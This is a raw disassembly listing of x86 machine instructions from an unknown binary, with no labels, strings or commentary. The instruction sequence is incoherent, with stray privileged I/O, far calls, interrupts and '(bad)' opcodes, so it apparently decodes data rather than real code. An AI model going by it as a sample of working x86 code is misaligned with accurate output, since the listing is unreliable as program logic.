  411b97:	sbb    esi,esi
  411b99:	jmp    0x8e2ef384
  411b9e:	sbb    eax,0x4f62f299
  411ba3:	cmp    ebx,DWORD PTR [ecx]
  411ba5:	cmc    
  411ba6:	jle    0x411b7e
  411ba8:	push   eax
  411ba9:	mov    eax,ds:0x8a0e9652
  411bae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411baf:	stc    
  411bb0:	cmp    DWORD PTR [edi+0xb40c],esi
  411bb6:	pop    ebx
  411bb7:	dec    ebx
  411bb8:	mov    dh,0x87
  411bba:	xchg   ebx,eax
  411bbb:	shl    BYTE PTR [ebx],1
  411bbd:	and    DWORD PTR [edx+esi*1-0x7f],esi
  411bc1:	inc    eax
  411bc2:	mov    ah,0x0
  411bc4:	add    BYTE PTR [esi-0x6467aaab],ah
  411bca:	mov    ah,bh
  411bcc:	add    BYTE PTR [eax],al
  411bce:	lock ds aad 0xd0
  411bd2:	imul   esi,DWORD PTR [ebx],0x6b89dbfb
  411bd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bd9:	mov    ch,0x5f
  411bdb:	mov    eax,ds:0x68416da1
  411be0:	mov    esi,0x781ae897
  411be5:	int    0xe1
  411be7:	test   al,0x3
  411be9:	mov    bl,0x1c
  411beb:	not    DWORD PTR [esi]
  411bed:	in     eax,dx
  411bee:	out    dx,eax
  411bef:	out    0x46,eax
  411bf1:	pop    ecx
  411bf2:	pushf  
  411bf3:	jl     0x411c3e
  411bf5:	dec    ebx
  411bf6:	test   DWORD PTR [edi],ebp
  411bf8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bf9:	stos   BYTE PTR es:[edi],al
  411bfa:	mov    bl,0x7b
  411bfc:	adc    BYTE PTR [esi],dl
  411bfe:	imul   edx,DWORD PTR [eax-0x50],0x1e
  411c02:	push   ebp
  411c03:	jns    0x411bbb
  411c05:	cli    
  411c06:	xor    eax,0x4128a635
  411c0b:	arpl   cx,sp
  411c0d:	nop
  411c0e:	sub    dh,BYTE PTR [eax+0x6b]
  411c11:	sub    al,0x4e
  411c13:	adc    eax,0xbe3a56d
  411c18:	addr16 retf 0x8a13
  411c1c:	sub    ebx,DWORD PTR [esi+0x1a62585b]
  411c22:	jae    0x411c97
  411c24:	push   edi
  411c25:	xlat   BYTE PTR ds:[ebx]
  411c26:	sahf   
  411c27:	shl    BYTE PTR [ebp-0x405e7112],cl
  411c2d:	pop    ss
  411c2e:	jle    0x411c97
  411c30:	nop
  411c31:	sub    DWORD PTR [edx-0x4b],ebx
  411c34:	push   es
  411c35:	and    BYTE PTR [esp+esi*1+0xda15c60],0xab
  411c3d:	fdivrp st(1),st
  411c3f:	xchg   ebp,eax
  411c40:	int    0x6a
  411c42:	je     0x411c56
  411c44:	popf   
  411c45:	fdivr  DWORD PTR [edx-0x3c]
  411c48:	das    
  411c49:	add    BYTE PTR [eax],al
  411c4b:	int3   
  411c4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c4d:	add    BYTE PTR [eax],al
  411c4f:	std    
  411c50:	jbe    0x411c6b
  411c52:	xchg   ebx,eax
  411c53:	and    dl,BYTE PTR [ebp+edi*4-0x29]
  411c57:	inc    ecx
  411c58:	bound  edx,QWORD PTR [esi+0x30aefa9a]
  411c5e:	dec    esi
  411c5f:	sub    BYTE PTR es:[ecx+0x4b],bl
  411c63:	mov    eax,ds:0x35304355
  411c68:	mov    bh,BYTE PTR [ebp+0x7c4562c1]
  411c6e:	sbb    al,0x13
  411c70:	inc    eax
  411c71:	enter  0x0,0x20
  411c75:	dec    esi
  411c76:	pop    ebx
  411c77:	adc    al,0x6b
  411c79:	aas    
  411c7a:	jl     0x411cd4
  411c7c:	add    DWORD PTR [esi+0x1a],0x41dc62d
  411c83:	pop    esi
  411c84:	add    BYTE PTR [eax],al
  411c86:	xchg   BYTE PTR [edi-0x311be09e],ah
  411c8c:	ja     0x411d09
  411c8e:	dec    edi
  411c8f:	mov    ds:0xcc6b230e,eax
  411c94:	fld    QWORD PTR [eax]
  411c96:	add    BYTE PTR [eax-0x3],dl
  411c99:	inc    eax
  411c9a:	sti    
  411c9b:	add    BYTE PTR [eax],al
  411c9d:	sub    al,0x52
  411c9f:	int3   
  411ca0:	xchg   edx,eax
  411ca1:	add    BYTE PTR [eax],al
  411ca3:	adc    bl,BYTE PTR [eax]
  411ca5:	adc    ecx,0x42b81c22
  411cab:	mov    ch,0xea
  411cad:	inc    esp
  411cae:	scas   al,BYTE PTR es:[edi]
  411caf:	add    BYTE PTR [eax],al
  411cb1:	and    esp,ebp
  411cb3:	lds    ebx,FWORD PTR [ebx-0x51a3d721]
  411cb9:	scas   eax,DWORD PTR es:[edi]
  411cba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cbb:	xor    dl,BYTE PTR [edi-0x734c7d55]
  411cc1:	add    BYTE PTR cs:[eax],al
  411cc4:	mov    esi,0xb39d50b5
  411cc9:	push   cs
  411cca:	mov    BYTE PTR [eax+eax*1],bl
  411ccd:	add    bl,bh
  411ccf:	mov    esi,0x2c47c1a7
  411cd4:	stc    
  411cd5:	stos   DWORD PTR es:[edi],eax
  411cd6:	in     eax,0xf
  411cd8:	xchg   ecx,eax
  411cd9:	lods   al,BYTE PTR ds:[esi]
  411cda:	clc    
  411cdb:	ins    BYTE PTR es:[edi],dx
  411cdc:	ret    0x8a3e
  411cdf:	ret    
  411ce0:	push   esi
  411ce1:	cmp    ch,al
  411ce3:	add    eax,0x72d07390
  411ce8:	dec    ebp
  411ce9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cea:	push   es
  411ceb:	fistp  DWORD PTR [eax+0x2e48ce5a]
  411cf1:	add    BYTE PTR [eax],al
  411cf3:	mov    dh,0x99
  411cf5:	pop    ds
  411cf6:	jp     0x411cec
  411cf8:	jg     0x411d45
  411cfa:	push   eax
  411cfb:	aad    0x20
  411cfd:	sbb    DWORD PTR [ebp+0x179cf2d],edx
  411d03:	les    edx,FWORD PTR [ebx-0x31ee0000]
  411d09:	push   0x67
  411d0b:	hlt    
  411d0c:	cmp    ebp,0x4e6e822a
  411d12:	lods   eax,DWORD PTR ds:[esi]
  411d13:	fstp   DWORD PTR ds:0xbc7a9060
  411d19:	adc    BYTE PTR [eax-0x6e439925],bl
  411d1f:	and    eax,0xaf06015a
  411d24:	xchg   BYTE PTR [eax],bl
  411d26:	test   ecx,esi
  411d28:	(bad)  
  411d29:	sbb    al,0xef
  411d2b:	jne    0x411d91
  411d2d:	neg    BYTE PTR [edi]
  411d2f:	adc    DWORD PTR [edx+0x36],edi
  411d32:	pop    esp
  411d33:	repnz pop ecx
  411d35:	jge    0x411ccf
  411d37:	pusha  
  411d38:	or     eax,0xf8fbb741
  411d3d:	and    al,0xa8
  411d3f:	fucom  st(5)
  411d41:	imul   eax,ecx,0x1e
  411d44:	add    al,BYTE PTR [eax+edx*4]
  411d47:	add    BYTE PTR [eax],al
  411d49:	jb     0x411d18
  411d4b:	icebp  
  411d4c:	cmp    eax,0x4fe24ee2
  411d51:	test   DWORD PTR [edi+0x54],esp
  411d54:	xchg   esi,eax
  411d55:	ss jno 0x411cf0
  411d58:	scas   eax,DWORD PTR es:[edi]
  411d59:	lods   al,BYTE PTR ds:[esi]
  411d5a:	add    ebx,ecx
  411d5c:	xchg   edx,eax
  411d5d:	ret    0xfbea
  411d60:	cmp    eax,0x19e213b3
  411d65:	imul   BYTE PTR [edi]
  411d67:	and    DWORD PTR [ecx+0x15f36dc3],esp
  411d6d:	fist   WORD PTR [eax+0x3c]
  411d70:	call   0xbc00:0xa140f6
  411d77:	das    
  411d78:	sti    
  411d79:	sar    esi,1
  411d7b:	ror    BYTE PTR ds:0xb3c00000,0x0
  411d82:	add    BYTE PTR [ebp-0x64],bl
  411d85:	jg     0x411d41
  411d87:	inc    edx
  411d88:	adc    BYTE PTR [ebx],bh
  411d8a:	pop    eax
  411d8b:	stos   DWORD PTR es:[edi],eax
  411d8c:	adc    dl,BYTE PTR [eax+0x78]
  411d8f:	dec    ecx
  411d90:	popf   
  411d91:	pop    ebx
  411d92:	push   eax
  411d93:	inc    edi
  411d94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d95:	mov    ch,0x2
  411d97:	popa   
  411d98:	lods   eax,DWORD PTR ds:[esi]
  411d99:	cwde   
  411d9a:	pop    ebx
  411d9b:	mov    al,0xc4
  411d9d:	xor    al,BYTE PTR [eax]
  411d9f:	add    BYTE PTR [eax+ecx*4+0x51f00000],al
  411da6:	xlat   BYTE PTR ds:[ebx]
  411da7:	pop    esi
  411da8:	sbb    al,0x26
  411daa:	cwde   
  411dab:	inc    ebx
  411dac:	xor    BYTE PTR [edi*8-0x5ecf4691],dh
  411db3:	xchg   ebx,eax
  411db4:	cmp    esi,DWORD PTR [esi+0xa048]
  411dba:	test   eax,0x5a2c8a03
  411dbf:	xchg   BYTE PTR [ebp+ebp*1-0x67],ch
  411dc3:	jp     0x411de0
  411dc5:	jecxz  0x411e0d
  411dc7:	les    edx,FWORD PTR [eax+eax*1+0xa27cb00]
  411dce:	mov    eax,ds:0xd5c0
  411dd3:	test   eax,0xd6fb588a
  411dd8:	push   esp
  411dd9:	adc    BYTE PTR [ebp-0x2a],ah
  411ddc:	fxch   st(4)
  411dde:	mov    bl,0x0
  411de0:	add    bh,bl
  411de2:	sahf   
  411de3:	add    ebx,eax
  411de5:	scas   eax,DWORD PTR es:[edi]
  411de6:	push   ebx
  411de7:	push   0x2c
  411de9:	ret    
  411dea:	jns    0x411de7
  411dec:	inc    ecx
  411ded:	dec    esp
  411dee:	dec    eax
  411def:	add    BYTE PTR [eax],al
  411df1:	mov    ecx,0xcdb903a9
  411df6:	lods   eax,DWORD PTR ds:[esi]
  411df7:	daa    
  411df8:	dec    eax
  411df9:	mov    ch,0x0
  411dfb:	add    ah,dh
  411dfd:	and    al,0xc8
  411dff:	rol    DWORD PTR [eax],1
  411e01:	add    cl,dh
  411e03:	mov    ch,0x82
  411e05:	into   
  411e06:	pop    ebp
  411e07:	push   ebx
  411e08:	xchg   ebp,eax
  411e09:	scas   al,BYTE PTR es:[edi]
  411e0a:	jne    0x411e14
  411e0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411e0d:	add    BYTE PTR [eax],al
  411e0f:	iret   
  411e10:	sbb    al,0x8e
  411e12:	mov    DWORD PTR [ecx+0x53],eax
  411e15:	test   eax,0x9d6ffb7a
  411e1a:	jmp    0x419c6b
  411e1f:	addr16 sbb eax,0xe20bf9ff
  411e25:	mov    edi,0xd1244e2f
  411e2a:	sbb    edx,ebp
  411e2c:	ins    BYTE PTR es:[edi],dx
  411e2d:	sbb    eax,0x570fe513
  411e32:	xor    al,0xe7
  411e34:	and    esp,DWORD PTR [eax+ebp*2+0x52]
  411e38:	out    dx,al
  411e39:	int    0x55
  411e3b:	cs es cmp eax,0xba79906b
  411e42:	cmp    bl,BYTE PTR [ecx-0x53]
  411e45:	es mov al,0x8e
  411e48:	out    0x1b,eax
  411e4a:	add    DWORD PTR [ebx-0x6f],ebx
  411e4d:	(bad)  
  411e4e:	(bad)  
  411e4f:	adc    eax,0xd34d90dc
  411e54:	add    al,0xed
  411e56:	add    BYTE PTR [eax],al
  411e58:	xchg   edx,eax
  411e59:	or     al,0x6a
  411e5b:	add    BYTE PTR [eax],al
  411e5d:	dec    ecx
  411e5e:	add    BYTE PTR [ebx+0x40220000],0x3e
  411e65:	add    BYTE PTR [eax],al
  411e67:	inc    ecx
  411e68:	sub    DWORD PTR [edx+eax*1+0x1],edi
  411e6c:	xor    ebx,esp
  411e6e:	pop    es
  411e6f:	xor    DWORD PTR [esi+0x21],edx
  411e72:	aad    0xda
  411e74:	add    BYTE PTR [edx],al
  411e76:	add    BYTE PTR [eax],al
  411e78:	mov    BYTE PTR [edi-0x71e1d8ec],0x5
  411e7f:	stos   DWORD PTR es:[edi],eax
  411e80:	or     BYTE PTR [eax+eax*1+0x0],dl
  411e84:	dec    edx
  411e85:	call   0x0:0x3e00ee2f
  411e8c:	push   ds
  411e8d:	into   
  411e8e:	test   DWORD PTR [ecx+0x39c16212],edx
  411e94:	inc    esp
  411e95:	mov    eax,0x3c8b0000
  411e9a:	stos   DWORD PTR es:[edi],eax
  411e9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e9c:	mov    eax,ds:0x2e6cb85a
  411ea1:	cdq    
  411ea2:	rcl    BYTE PTR [ecx-0x73],1
  411ea5:	lahf   
  411ea6:	mov    esp,0x2e335ce5
  411eab:	jl     0x411ed4
  411ead:	sub    eax,0x77e86842
  411eb2:	dec    edx
  411eb3:	adc    al,0xcb
  411eb5:	stc    
  411eb6:	or     esi,ebx
  411eb8:	retf   0x87c6
  411ebb:	addr16 (bad) 
  411ebd:	pusha  
  411ebe:	lahf   
  411ebf:	out    0xb3,eax
  411ec1:	pop    edi
  411ec2:	ja     0x411eea
  411ec4:	mov    ebp,0x5a37965
  411ec9:	cmp    ah,BYTE PTR [edi+0x67]
  411ecc:	jne    0x411e6b
  411ece:	ds inc edi
  411ed0:	shr    edi,1
  411ed2:	xlat   BYTE PTR ds:[ebx]
  411ed3:	dec    ebp
  411ed4:	mov    ah,0xf4
  411ed6:	ror    BYTE PTR [eax-0x44ffff73],cl
  411edc:	test   BYTE PTR [ebx-0xaae0000],al
  411ee2:	jns    0x411ecf
  411ee4:	out    0xb5,eax
  411ee6:	call   0x891c:0x9b62aaf9
  411eed:	shl    DWORD PTR [edx-0x36],0xde
  411ef1:	hlt    
  411ef2:	push   ds
  411ef3:	retf   0xf8e4
  411ef6:	jecxz  0x411ec3
  411ef8:	jns    0x411e95
  411efa:	xadd   BYTE PTR [eax+eax*1],ah
  411efe:	add    BYTE PTR [esi+0x58],cl
  411f01:	or     al,0x39
  411f03:	add    BYTE PTR [eax],al
  411f05:	jg     0x411e9f
  411f07:	fdivr  DWORD PTR [ecx-0x43a5dd16]
  411f0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f0e:	(bad)  
  411f0f:	int3   
  411f10:	or     al,0x0
  411f12:	add    BYTE PTR [edi-0x6a],dl
  411f15:	imul   ebx,DWORD PTR [esi+0x370ce0],0x70d70f00
  411f1f:	fld    TBYTE PTR [esi-0x184c8a8a]
  411f25:	scas   al,BYTE PTR es:[edi]
  411f26:	lock mov eax,DWORD PTR [ebp+0x5a]
  411f2a:	push   0x6c
  411f2c:	leave  
  411f2d:	aad    0x8d
  411f2f:	rol    DWORD PTR [edi+0x688b105e],1
  411f35:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f37:	retf   0x5436
  411f3a:	rcr    ebx,1
  411f3c:	in     al,dx
  411f3d:	test   eax,ebp
  411f3f:	xor    dl,dl
  411f41:	and    ebp,DWORD PTR [ebp-0x29]
  411f44:	clc    
  411f45:	mov    ch,0x58
  411f47:	and    dl,bl
  411f49:	lds    ebp,FWORD PTR [eax-0x56]
  411f4c:	xchg   BYTE PTR ds:0xee7ab5d2,bh
  411f52:	ins    DWORD PTR es:[edi],dx
  411f53:	mov    edx,0x9f9db9
  411f58:	xchg   edx,eax
  411f59:	add    BYTE PTR [eax],al
  411f5b:	cmp    eax,0x56cc
  411f60:	loop   0x411f64
  411f62:	inc    eax
  411f63:	dec    eax
  411f64:	add    BYTE PTR [eax],al
  411f66:	loopne 0x411fc4
  411f68:	call   eax
  411f6a:	imul   ecx,DWORD PTR [ebx-0x7c9ddc08],0xbc61a3ed
  411f74:	inc    edx
  411f75:	adc    al,0x94
  411f77:	imul   esi,DWORD PTR [edx+ecx*8],0x6613b8b1
  411f7e:	sub    al,0xa9
  411f80:	cs mov ch,0x99
  411f83:	add    dl,dh
  411f85:	inc    esp
  411f86:	inc    edi
  411f87:	add    BYTE PTR [eax],al
  411f89:	ficomp WORD PTR [ecx-0x76]
  411f8c:	push   edi
  411f8d:	add    eax,0x8b1c4aaf
  411f92:	retf   
  411f93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f94:	scas   al,BYTE PTR es:[edi]
  411f95:	sbb    BYTE PTR [edx+0x8fcf2c6],ch
  411f9b:	lock add BYTE PTR [eax],al
  411f9e:	test   DWORD PTR [edi+0x2b],ecx
  411fa1:	scas   eax,DWORD PTR es:[edi]
  411fa2:	shl    DWORD PTR [ebx-0x5f],cl
  411fa5:	adc    DWORD PTR [ecx-0x58],esp
  411fa8:	push   ebp
  411fa9:	or     eax,0x7fb966cf
  411fae:	in     eax,dx
  411faf:	outs   dx,BYTE PTR ds:[esi]
  411fb0:	jmp    0x1d3591c6
  411fb5:	pop    esp
  411fb6:	inc    esp
  411fb7:	pop    ebx
  411fb8:	add    BYTE PTR [eax],al
  411fba:	adc    eax,0x811c932b
  411fbf:	fist   DWORD PTR [esi-0x59]
  411fc2:	xchg   ecx,eax
  411fc3:	dec    ecx
  411fc4:	daa    
  411fc5:	nop
  411fc6:	scas   al,BYTE PTR es:[edi]
  411fc7:	ds jae 0x411f64
  411fca:	out    dx,eax
  411fcb:	mov    edx,0x20226ef1
  411fd0:	call   0x3243c934
  411fd5:	pop    ds
  411fd6:	loope  0x411ff2
  411fd8:	hlt    
  411fd9:	mov    ds:0x7fa06d35,eax
  411fde:	test   al,0xe2
  411fe0:	add    eax,0xe9405089
  411fe5:	add    BYTE PTR [eax],al
  411fe7:	sub    eax,0xb371aaf9
  411fec:	dec    edx
  411fed:	sahf   
  411fee:	stos   BYTE PTR es:[edi],al
  411fef:	dec    eax
  411ff0:	lods   eax,DWORD PTR ds:[esi]
  411ff1:	add    BYTE PTR [eax],al
  411ff3:	loope  0x411f8f
  411ff5:	mov    DWORD PTR [esi],esi
  411ff7:	mov    bh,ch
  411ff9:	add    BYTE PTR [eax],al
  411ffb:	mov    edx,?
  411ffd:	add    BYTE PTR [eax],al
  411fff:	hlt    
  412000:	dec    esp
  412001:	push   esi
  412002:	add    BYTE PTR [eax],al
  412004:	into   
  412005:	sti    
  412006:	rcl    BYTE PTR [eax-0x3b],cl
  412009:	dec    edx
  41200a:	pop    esp
  41200b:	or     ch,BYTE PTR [ebp-0x8]
  41200e:	add    esi,DWORD PTR [edx-0x44db82f5]
  412014:	cs jl  0x41203c
  412017:	das    
  412018:	push   esi
  412019:	int3   
  41201a:	push   edx
  41201b:	add    BYTE PTR [eax],al
  41201d:	jg     0x411ff3
  41201f:	gs int 0x4a
  412022:	(bad)  
  412023:	mov    bh,0xc1
  412025:	sub    al,0x40
  412027:	add    al,0x0
  412029:	add    BYTE PTR [ebx],bl
  41202b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41202c:	jbe    0x412039
  41202e:	in     al,0x60
  412030:	add    eax,0x93f27075
  412035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412036:	mov    al,0x9a
  412038:	inc    ecx
  412039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41203a:	scas   al,BYTE PTR es:[edi]
  41203b:	adc    al,BYTE PTR ds:[esi]
  41203e:	out    dx,al
  41203f:	inc    esp
  412040:	pop    ss
  412041:	add    BYTE PTR [eax],al
  412043:	retf   
  412044:	into   
  412045:	push   0xa61a9efb
  41204a:	fsubrp st(6),st
  41204c:	es mov ecx,ebp
  41204f:	clc    
  412050:	and    eax,0x2ca23cf0
  412055:	push   ds
  412056:	pop    ebp
  412057:	or     DWORD PTR [ecx+0x42],0x78
  41205b:	sar    DWORD PTR [eax+ebp*2],0x44
  41205f:	rol    BYTE PTR [eax],cl
  412061:	add    bl,dh
  412063:	xlat   BYTE PTR ds:[ebx]
  412064:	xlat   BYTE PTR ds:[ebx]
  412065:	aaa    
  412066:	aas    
  412067:	in     al,0x84
  412069:	sbb    eax,DWORD PTR [eax]
  41206b:	add    bh,dh
  41206d:	mov    ch,0xd4
  41206f:	push   ss
  412070:	popf   
  412071:	push   esp
  412072:	push   0xffffffff
  412074:	bound  edx,QWORD PTR [esi]
  412076:	fmul   st,st(7)
  412078:	call   DWORD PTR [ecx+0x5a]
  41207b:	xchg   ebp,eax
  41207c:	out    0x94,al
  41207e:	mov    ah,0x9d
  412080:	mov    dl,0x68
  412082:	into   
  412083:	cld    
  412084:	xchg   esp,eax
  412085:	or     edi,ebp
  412087:	add    DWORD PTR [edx+0x73252499],esp
  41208d:	in     eax,0x51
  41208f:	cmp    al,0x1f
  412091:	aam    0xbc
  412093:	fbld   TBYTE PTR [edi]
  412095:	and    eax,0xdea4eacf
  41209a:	pop    es
  41209b:	push   edi
  41209c:	(bad)  
  41209d:	(bad)  
  41209e:	fs push eax
  4120a0:	iret   
  4120a1:	rcl    dh,1
  4120a3:	mov    ds:0xcfac34ce,al
  4120a8:	add    eax,0xb499420
  4120ad:	outs   dx,BYTE PTR ds:[esi]
  4120ae:	and    esi,ecx
  4120b0:	cmp    eax,0xcde93dc5
  4120b5:	dec    edi
  4120b6:	sub    al,0x1f
  4120b8:	xchg   ebp,eax
  4120b9:	mov    eax,0x5b30d141
  4120be:	and    ecx,DWORD PTR [esp+0x11260000]
  4120c5:	stc    
  4120c6:	jmp    0x881f:0xc21b0a7a
  4120cd:	cmp    eax,DWORD PTR [eax]
  4120cf:	add    BYTE PTR [esp+edx*8+0x5eb90000],al
  4120d6:	lods   eax,DWORD PTR ds:[esi]
  4120d7:	sbb    al,0x5
  4120d9:	mov    ds:0x43c9034,al
  4120de:	xor    al,0x0
  4120e0:	add    bl,bl
  4120e2:	lds    eax,FWORD PTR [esi]
  4120e4:	and    BYTE PTR [ebx+0x28],bh
  4120e7:	sub    DWORD PTR [ebp-0x16e4d65f],ecx
  4120ed:	gs push ss
  4120ef:	ret    0xd3b5
  4120f2:	shl    ecx,1
  4120f4:	loopne 0x4120cb
  4120f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120f7:	mov    al,ds:0x36ea63d2
  4120fc:	sub    BYTE PTR [ebp+edx*2-0x4b],0x4b
  412101:	call   0xe6d4:0xf8e08f4e
  412108:	rol    DWORD PTR [ebx+0x28],0x4
  41210c:	rol    DWORD PTR [eax],0x0
  41210f:	pusha  
  412110:	mov    ebp,0xdb373690
  412115:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412116:	pop    esp
  412117:	das    
  412118:	lods   al,BYTE PTR ds:[esi]
  412119:	push   0xb648d46d
  41211e:	add    BYTE PTR [eax],al
  412120:	jbe    0x412153
  412122:	loope  0x412141
  412124:	iret   
  412125:	stc    
  412126:	in     eax,dx
  412127:	mov    ah,0x5e
  412129:	pop    ds
  41212a:	int    0x43
  41212c:	dec    ebp
  41212d:	sbb    esp,edx
  41212f:	cmp    DWORD PTR [edx-0x74a99593],esp
  412135:	cmc    
  412136:	xchg   bl,dl
  412138:	loope  0x412145
  41213a:	mov    esp,DWORD PTR [ebp-0x5]
  41213d:	bound  ebp,QWORD PTR [edx]
  41213f:	stos   DWORD PTR es:[edi],eax
  412140:	or     BYTE PTR [esi+0x35490000],ah
  412146:	js     0x412157
  412148:	and    dh,BYTE PTR [edx+0x5738d2d]
  41214e:	jecxz  0x41211e
  412150:	popf   
  412151:	dec    ebx
  412152:	and    al,0x4
  412154:	call   0xad1d:0xb33f0000
  41215b:	sub    DWORD PTR [ecx-0x2e2d4ffa],0xffffff82
  412162:	mov    ds:0xd7f6d3c6,al
  412167:	ret    
  412168:	jb     0x412106
  41216a:	mov    al,ds:0x68fd7dde
  41216f:	pusha  
  412170:	add    esp,DWORD PTR [esi]
  412172:	dec    edi
  412173:	jmp    0x41215d
  412175:	sub    al,0xc2
  412177:	out    dx,al
  412178:	cdq    
  412179:	fild   DWORD PTR [esi-0x4cfac7a5]
  41217f:	scas   al,BYTE PTR es:[edi]
  412180:	jnp    0x4121dd
  412182:	ficomp WORD PTR [eax+0x5e4ad492]
  412188:	cmc    
  412189:	stc    
  41218a:	ja     0x412111
  41218c:	sbb    dl,BYTE PTR [edx+0x4b]
  41218f:	sub    DWORD PTR [eax+0x4c6afcf7],edi
  412195:	add    al,0x0
  412197:	add    BYTE PTR [esi+0x130d71ce],al
  41219d:	popa   
  41219e:	pop    edi
  41219f:	push   ebx
  4121a0:	sub    ebx,DWORD PTR [esi+0x621abba3]
  4121a6:	mov    eax,ds:0x5369badc
  4121ab:	adc    eax,0xf6fc9074
  4121b0:	sub    dh,BYTE PTR [eax+0xd]
  4121b3:	jle    0x4121a3
  4121b5:	mov    edi,0x8a988da1
  4121ba:	stos   DWORD PTR es:[edi],eax
  4121bb:	call   0x72499741
  4121c0:	add    BYTE PTR [eax],al
  4121c2:	out    0x68,eax
  4121c4:	retf   0x44a7
  4121c7:	inc    eax
  4121c8:	add    BYTE PTR [eax],al
  4121ca:	aad    0x29
  4121cc:	out    0x52,al
  4121ce:	scas   al,BYTE PTR es:[edi]
  4121cf:	add    al,0xee
  4121d1:	add    BYTE PTR [eax],al
  4121d3:	call   0xb2ca:0xb630b972
  4121da:	pop    edi
  4121db:	test   DWORD PTR [ebp-0x27],ebx
  4121de:	dec    eax
  4121df:	dec    ebx
  4121e0:	add    BYTE PTR [eax],al
  4121e2:	das    
  4121e3:	or     eax,0x6534703e
  4121e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121e9:	push   edx
  4121ea:	jno    0x4121a1
  4121ec:	ins    DWORD PTR es:[edi],dx
  4121ed:	push   es
  4121ee:	xor    eax,0x91202d71
  4121f3:	(bad)  
  4121f4:	in     al,0x6f
  4121f6:	(bad)  
  4121f7:	dec    ebx
  4121f8:	(bad)  
  4121f9:	adc    al,0x35
  4121fb:	(bad)  
  4121fc:	in     al,0x73
  4121fe:	and    eax,0x60a8555d
  412203:	loopne 0x41225e
  412205:	pop    eax
  412206:	or     eax,edi
  412208:	sbb    DWORD PTR [ecx+0x1a],eax
  41220b:	lods   eax,DWORD PTR ds:[esi]
  41220c:	pop    eax
  41220d:	adc    al,0xb4
  41220f:	das    
  412210:	(bad)  
  412211:	cmp    BYTE PTR [ebx-0x40],ch
  412214:	aad    0x0
  412216:	add    BYTE PTR [ebp-0x7128c5a9],al
  41221c:	pusha  
  41221d:	test   BYTE PTR [esi+0x0],ah
  412220:	add    BYTE PTR [ebx-0x7efcdfa5],ch
  412226:	daa    
  412227:	pop    ss
  412228:	cmp    BYTE PTR [eax+0x784802],dh
  41222e:	add    BYTE PTR [ebp+0x15],bh
  412231:	push   DWORD PTR [ecx+edx*2-0x74]
  412235:	in     eax,0x0
  412237:	add    BYTE PTR [ecx+0x6b],ch
  41223a:	call   0xee:0xc85ca0d6
  412241:	add    BYTE PTR [esi-0x34],dh
  412244:	inc    DWORD PTR [eax]
  412246:	add    BYTE PTR [esi],dl
  412248:	addr16 popf 
  41224a:	mov    ds:0xee3473a8,al
  41224f:	mov    edx,0xb0712c1a
  412254:	loopne 0x412280
  412256:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412257:	icebp  
  412258:	jl     0x41228e
  41225a:	mov    edx,0xcbbcdbb0
  41225f:	sub    eax,edi
  412261:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412262:	loope  0x412278
  412264:	adc    eax,0xa9d317df
  412269:	nop
  41226a:	xor    BYTE PTR [eax+0x16],0x94
  41226e:	aaa    
  41226f:	fist   WORD PTR [ebp-0x48]
  412272:	fisttp WORD PTR [ecx+edi*2]
  412275:	add    BYTE PTR [eax],al
  412277:	inc    edx
  412278:	inc    ebp
  412279:	(bad)  
  41227a:	and    bl,dh
  41227c:	sub    BYTE PTR [edi],ch
  41227e:	mov    ds:0xd02ec531,al
  412283:	pop    esp
  412284:	or     al,0xb
  412286:	add    BYTE PTR [eax],al
  412288:	mov    cl,0xa2
  41228a:	daa    
  41228b:	dec    ebx
  41228c:	mov    ah,0xe3
  41228f:	add    BYTE PTR [eax],al
  412291:	jl     0x4122e9
  412293:	(bad)  
  412294:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412295:	mov    edi,0xfb3ea58b
  41229a:	loopne 0x412279
  41229c:	jb     0x41228e
  41229e:	pop    ebp
  41229f:	adc    al,0x65
  4122a1:	mul    DWORD PTR [eax]
  4122a3:	js     0x412246
  4122a5:	ret    
  4122a6:	les    edi,FWORD PTR [eax+0x29530000]
  4122ac:	or     ebp,DWORD PTR [ebx+0x3d597503]
  4122b2:	push   0x17ddfd3f
  4122b7:	std    
  4122b8:	in     eax,0x87
  4122ba:	cmc    
  4122bb:	xchg   DWORD PTR [edx-0x67],ebp
  4122be:	jb     0x412241
  4122c0:	ja     0x412279
  4122c2:	sub    dh,BYTE PTR [esi+0x126bf518]
  4122c8:	mov    cl,0xb4
  4122ca:	ja     0x412336
  4122cc:	mov    al,0xb6
  4122ce:	ss ss (bad) 
  4122d1:	(bad)  
  4122d2:	pop    esi
  4122d3:	stc    
  4122d4:	fiadd  DWORD PTR [esi+esi*4+0x2fef0000]
  4122db:	xchg   esp,eax
  4122dc:	xchg   esi,eax
  4122dd:	mov    ah,0xfd
  4122df:	xchg   DWORD PTR cs:[edx+0x22d4f59a],eax
  4122e6:	jo     0x4122c1
  4122e8:	test   BYTE PTR [edx],ah
  4122ea:	add    BYTE PTR [eax],al
  4122ec:	mov    ebp,0xa1b2ec64
  4122f1:	rcr    BYTE PTR [edx-0x3e2f0000],0xca
  4122f8:	adc    BYTE PTR [ebx-0x7ea02fe0],al
  4122fe:	loop   0x4122f0
  412300:	fucom  st(0)
  412303:	jae    0x412285
  412305:	fld    DWORD PTR [eax]
  412307:	add    BYTE PTR [edi+0x4a4eddf0],al
  41230d:	sub    BYTE PTR [edx-0x11],ch
  412310:	pusha  
  412311:	jb     0x4122bb
